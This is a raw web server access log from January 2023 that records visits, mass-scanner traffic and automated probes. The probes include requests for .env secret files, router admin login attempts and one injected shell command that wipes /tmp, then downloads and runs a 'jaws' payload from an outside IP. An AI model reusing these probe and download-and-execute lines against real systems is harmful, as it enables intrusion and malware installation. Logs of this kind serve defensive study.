143.110.222.166 - - [17/Jan/2023:11:05:17 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
91.240.118.111 - - [17/Jan/2023:11:18:47 -0600] "GET / HTTP/1.0" 301 233 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
179.43.177.242 - - [17/Jan/2023:11:18:59 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
185.254.196.223 - - [17/Jan/2023:11:21:35 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [17/Jan/2023:11:21:35 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.130.219.2 - - [17/Jan/2023:11:30:38 -0600] "GET /wp-login.php HTTP/1.1" 301 253 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96"
92.118.39.82 - - [17/Jan/2023:11:34:29 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
91.240.118.111 - - [17/Jan/2023:11:37:35 -0600] "GET / HTTP/1.0" 301 233 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
4.17.224.133 - - [17/Jan/2023:11:58:21 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
4.17.224.133 - - [17/Jan/2023:11:58:21 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
179.43.177.242 - - [17/Jan/2023:12:06:11 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
154.89.5.43 - - [17/Jan/2023:12:06:19 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
143.110.222.166 - - [17/Jan/2023:12:11:27 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
167.71.164.238 - - [17/Jan/2023:12:42:40 -0600] "GET / HTTP/1.0" 301 233 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
143.110.222.166 - - [17/Jan/2023:13:10:43 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
82.180.143.253 - - [17/Jan/2023:13:56:00 -0600] "GET / HTTP/1.1" 301 241 "https://google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0"
205.185.118.237 - - [17/Jan/2023:13:59:31 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [17/Jan/2023:14:05:25 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
167.94.145.58 - - [17/Jan/2023:14:14:57 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
167.94.145.58 - - [17/Jan/2023:14:14:57 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.58 - - [17/Jan/2023:14:14:58 -0600] "PRI * HTTP/2.0" 400 226 "-" "-"
41.236.192.104 - - [17/Jan/2023:14:16:47 -0600] "GET /shell?cd+/tmp;rm+-rf+*;wget+45.12.253.180/jaws;sh+/tmp/jaws HTTP/1.1" 301 291 "-" "Hello, world"
185.254.196.223 - - [17/Jan/2023:14:25:08 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
